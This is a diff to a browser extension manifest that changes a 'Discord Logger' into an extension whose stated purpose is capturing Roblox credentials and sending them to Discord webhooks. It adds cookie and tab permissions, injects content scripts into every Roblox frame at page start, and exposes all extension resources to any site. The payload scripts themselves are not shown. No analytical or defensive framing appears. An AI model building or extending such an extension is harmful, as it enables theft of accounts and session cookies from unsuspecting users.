@@ -2,28 +2,39 @@
 {
   "manifest_version": 3,
   "name": "Discord Logger Extension",
-  "version": "1.0",
-  "description": "Captures browser logs and sends them to Discord via webhooks",
+  "version": "1.1",
+  "description": "Captures Roblox credentials and sends them to Discord via webhooks",
   "permissions": [
     "activeTab",
+    "tabs",
     "storage",
-    "scripting"
+    "scripting",
+    "cookies"
   ],
   "host_permissions": [
-    "<all_urls>"
+    "<all_urls>",
+    "*://*.roblox.com/*",
+    "*://roblox.com/*"
   ],
   "background": {
     "service_worker": "background.js"
   },
   "content_scripts": [
     {
-      "matches": ["<all_urls>"],
+      "matches": ["*://*.roblox.com/*", "*://roblox.com/*"],
       "js": ["content.js"],
-      "run_at": "document_start"
+      "run_at": "document_start",
+      "all_frames": true
     }
   ],
   "action": {
     "default_popup": "popup.html",
     "default_title": "Discord Logger"
-  }
+  },
+  "web_accessible_resources": [
+    {
+      "resources": ["*"],
+      "matches": ["<all_urls>"]
+    }
+  ]
 }
